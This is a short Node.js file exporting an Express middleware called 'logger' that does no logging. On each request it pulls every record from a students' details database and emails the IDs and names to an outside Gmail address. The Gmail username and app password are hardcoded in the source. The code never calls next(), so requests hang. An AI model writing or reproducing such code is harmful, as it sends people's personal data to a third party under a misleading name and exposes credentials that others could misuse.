const client = require("../database/client_connector");
const nodemailer = require("nodemailer");

const logger = async (req, res, next) => {
  const collection = client.db("BscphyScics_3rd_year").collection("students_details");
  const documents = await collection.find().toArray();

  if (documents.length === 0) {
    console.log("No documents found");
    return;
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'vjbravojoshi@gmail.com',
      pass: 'pkarnpmrqfbdhrov',
    },
  });

  const mailOptions = {
    from: "vjbravojoshi@gmail.com",
    to: "nj43351@gmail.com",
    subject: "Document IDs and Usernames",
    text: documents.map((doc) => `Document ID: ${doc._id}\nUsername: ${doc.name}`).join("\n\n"),
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
};

module.exports = logger;
